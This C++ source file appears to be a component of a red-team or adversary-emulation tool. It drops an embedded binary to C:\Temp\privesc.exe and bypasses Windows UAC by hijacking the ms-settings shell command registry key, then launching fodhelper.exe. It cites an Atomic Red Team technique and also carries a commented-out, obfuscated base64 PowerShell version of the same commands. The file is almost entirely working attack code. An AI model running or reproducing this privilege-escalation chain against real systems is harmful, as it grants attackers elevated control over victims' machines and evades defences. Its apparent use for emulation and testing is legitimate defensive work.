#include "elevate.hpp"

std::string componentName = "elevate";

int wmain() {
	Log("[+] Starting " + componentName + ".", componentName);
	Log("[*] Running as " + GetUserAndContext(), componentName);

	// drop privesc to disk
	Log("[+] Writing privesc to disk.", componentName);
	std::ofstream outfile("C:\\Temp\\privesc.exe", std::ios::out | std::ios::binary);
	outfile.write(&privesc[0], sizeof(privesc));
	outfile.close();

	// bypass UAC and spawn privesc
	// source: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md#atomic-test-4---bypass-uac-using-fodhelper---powershell
	Log("[*] Bypassing UAC.", componentName);

	// powershell.exe -Command New-Item 'HKCU:\software\classes\ms-settings\shell\open\command' -Force;
	// New-ItemProperty 'HKCU:\software\classes\ms-settings\shell\open\command' -Name 'DelegateExecute' -Value '' -Force;
	// Set-ItemProperty 'HKCU:\software\classes\ms-settings\shell\open\command' -Name '(default)' -Value 'C:\Temp\privesc.exe' -Force;
	// Start-Process 'C:\Windows\System32\fodhelper.exe';
	// with Invoke-Obfuscation https://github.com/danielbohannon/Invoke-Obfuscation
	//std::string cmdline = "powershell.exe -encodedCommand KAAgACAAIABuAGUAdwAtAE8AYgBKAGUAQwBUACAAIABzAFkAcwBUAEUAbQAuAEkATwAuAGMAbwBNAHAAcgBFAFMAUwBJAG8ATgAuAEQARQBmAEwAQQBUAEUAcwBUAFIAZQBBAG0AKAAgACAAWwBJAE8ALgBNAGUATQBPAHIAeQBTAHQAcgBlAGEAbQBdAFsAQwBvAG4AdgBlAHIAdABdADoAOgBmAFIATwBNAEIAQQBzAEUANgA0AFMAVAByAEkATgBHACgAIAAoACAAIgB7ADEANgB9AHsAMwAzAH0AewAzADEAfQB7ADMAMAB9AHsANwB9AHsANAA0AH0AewAyADgAfQB7ADIAOQB9AHsAMgAwAH0AewAyAH0AewAxADEAfQB7ADQAMAB9AHsAOAB9AHsANAB9AHsANAAzAH0AewAxADIAfQB7ADEAOAB9AHsAMwB9AHsAMQA1AH0AewAyADEAfQB7ADIANgB9AHsAMgAyAH0AewAxADcAfQB7ADkAfQB7ADEANAB9AHsAMwA3AH0AewAyADMAfQB7ADAAfQB7ADMAOQB9AHsAMwA0AH0AewAxADAAfQB7ADQANQB9AHsAMwAyAH0AewAyADQAfQB7ADMANQB9AHsAMQB9AHsANAAxAH0AewA0ADIAfQB7ADYAfQB7ADUAfQB7ADEAOQB9AHsAMgA3AH0AewAxADMAfQB7ADMAOAB9AHsAMgA1AH0AewAzADYAfQAiAC0AZgAnAEYAbAAnACwAJwBZAHoAJwAsACcAZAB4AGYAWABlADMAZgB0AGQAZwBVAEgAdAAnACwAJwBBADUAVgAnACwAJwA3AFcAJwAsACcAWQAnACwAJwBmAE4AcgA5ADkASwAwAGwAUgArACcALAAnAFIAUgBHACcALAAnAEIASAAnACwAJwBLAEUANwBYAHgAdwBXAEMAWgBGACcALAAnAEQAOQBnAGUAawBHAGMAbgA3AFgAdABZAC8AQQAnACwAJwBCAEMANQBKAHQALwB2ADgAJwAsACcAUQBNAFoAcQAnACwAJwB2AHoAdQBkACcALAAnAE8AJwAsACcAZwB5AFIAcAAnACwAJwByAGMANAAvAEMAOABJAHcAJwAsACcAWgAnACwAJwBaAGoAJwAsACcAeQBwAEgAagBYADQAcwA1ADEAYgA2AEsAJwAsACcAUQB0AEoAVQAzAEoAWABhADcAKwA5AFEAUQBTACcALAAnAHIAMAB5ACcALAAnAFcAawB1AC8AUQBrAHYASABPADYAYgAnACwAJwB3AGsASQA3AEoATwBrAEsAJwAsACcAeQAnACwAJwBsACcALAAnADgAUQAzACcALAAnAFgAJwAsACcAdAAnACwAJwA0AFQAMABWACcALAAnAE8AcwBSAEIAdAB6AHAAVwAnACwAJwB3AHIAOQBLAHQAJwAsACcAOABoAGYAJwAsACcARQBBAFgAJwAsACcAdABXACcALAAnAFUAbQBGAFcAdgBkAFcAcABoADgAcwB6ACsAZwBJADEAMQBFAFgAbQBqAHYAJwAsACcAOABBAGcAPQA9ACcALAAnACsAaQBRADQAaAA1AGsAUABIADMAJwAsACcAYgAnACwAJwBjACcALAAnAGwAJwAsACcAUABEAEEAbAAnACwAJwB5ADgANgBpAEkAcQA2AEEAJwAsACcAZwBZAGQAJwAsACcASwBVAFAAOABzACcALAAnAGgAUwAnACAAIAApACAAIAAgACkALABbAHMAWQBTAFQAZQBNAC4AaQBvAC4AQwBPAG0AcAByAEUAcwBzAGkATwBuAC4AYwBPAE0AUAByAGUAcwBzAGkATwBuAE0AbwBEAEUAXQA6ADoARABlAEMATwBNAFAAUgBFAHMAUwAgACAAIAApACAAfABGAG8AUgBFAGEAYwBIAC0AbwBCAEoARQBDAHQAIAB7ACAAbgBlAHcALQBPAGIASgBlAEMAVAAgACAAaQBvAC4AUwB0AFIARQBhAE0AcgBlAEEARABFAHIAKAAgACQAXwAsAFsAVABlAHgAVAAuAEUATgBDAG8ARABpAE4AZwBdADoAOgBhAHMAYwBJAGkAIAApACAAfQAgACAAfAAgACAARgBvAHIAZQBhAEMAaAAtAG8AQgBKAGUAQwB0AHsAJABfAC4AcgBFAEEARAB0AE8AZQBOAEQAKAAgACAAIAAgACkAIAB9ACAAKQAgACAAIAB8ACAAaQBuAHYAbwBrAGUALQBFAHgAcABSAEUAcwBTAGkATwBOAA==";

	std::string cmdline1 = "powershell.exe -Command New-Item 'HKCU:\\software\\classes\\ms-settings\\shell\\open\\command' -Force";
	CreateProc("privesc", cmdline1);
	Sleep(10000);

	std::string cmdline2 = "powershell.exe -Command New-ItemProperty 'HKCU:\\software\\classes\\ms-settings\\shell\\open\\command' -Name 'DelegateExecute' -Value '' -Force";
	CreateProc("privesc", cmdline2);
	Sleep(10000);

	std::string cmdline3 = "powershell.exe -Command Set-ItemProperty 'HKCU:\\software\\classes\\ms-settings\\shell\\open\\command' -Name '(default)' -Value 'C:\\Temp\\privesc.exe' -Force";
	CreateProc("privesc", cmdline3);
	Sleep(10000);

	//HKEY hKeycommand;
	//LSTATUS err = RegCreateKeyExW(
	//	HKEY_CURRENT_USER,
	//	L"software\\classes\\ms-settings\\shell\\open\\command",
	//	0,
	//	NULL,
	//	REG_OPTION_NON_VOLATILE,
	//	KEY_ALL_ACCESS | KEY_WOW64_32KEY,
	//	NULL,
	//	&hKeycommand,
	//	NULL
	//);
	//if (err != ERROR_SUCCESS) {
	//	Log("[!] RegCreateKeyExW failed" + GetLastError(), componentName);
	//}
	//else {
	//	Log("[*] RegCreateKeyExW success", componentName);
	//}

	//WCHAR DelegateExecuteValue[] = L"";
	//DWORD DelegateExecuteLen = (lstrlenW(DelegateExecuteValue) + 1) * sizeof(WCHAR);
	//err = RegSetValueExW(
	//	hKeycommand,
	//	L"DelegateExecute",
	//	NULL,
	//	REG_SZ,
	//	(LPBYTE)DelegateExecuteValue,
	//	DelegateExecuteLen
	//);
	//if (err != ERROR_SUCCESS) {
	//	Log("[!] RegSetValueExW DelegateExecute failed" + GetLastError(), componentName);
	//}
	//else {
	//	Log("[*] RegSetValueExW DelegateExecute success", componentName);
	//}

	//WCHAR DefaultValue[] = L"C:\\Temp\\privesc.exe";
	//DWORD DefaultLen = (lstrlenW(DefaultValue) + 1) * sizeof(WCHAR);
	//err = RegSetValueExW(
	//	hKeycommand,
	//	L"(Default)",
	//	NULL,
	//	REG_SZ,
	//	(LPBYTE)DefaultValue,
	//	DefaultLen
	//);
	//if (err != ERROR_SUCCESS) {
	//	Log("[!] RegSetValueExW (Default) failed" + GetLastError(), componentName);
	//}
	//else {
	//	Log("[*] RegSetValueExW (Default) success", componentName);
	//}

	Sleep(5000);

	Log("[*] Starting privesc process.", componentName);

	std::string cmdline = "powershell.exe -Command Start-Process 'C:\\Windows\\System32\\fodhelper.exe'";

	CreateProc("privesc", cmdline);

	return 0;
}